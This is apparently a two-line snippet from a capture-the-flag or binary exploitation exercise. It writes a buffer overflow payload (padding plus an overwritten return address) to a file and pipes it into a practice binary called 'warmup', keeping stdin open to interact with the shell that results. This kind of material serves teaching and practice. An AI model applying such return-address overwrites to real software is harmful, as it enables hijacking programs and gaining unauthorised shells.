python3 bytes_to_ascii.py 'b"A" * 20 + b"\x50\x11\x40\x00\x00\x00\x00\x00\x0a"' > warmup.exploit
(cat warmup.exploit; cat) | ./warmup
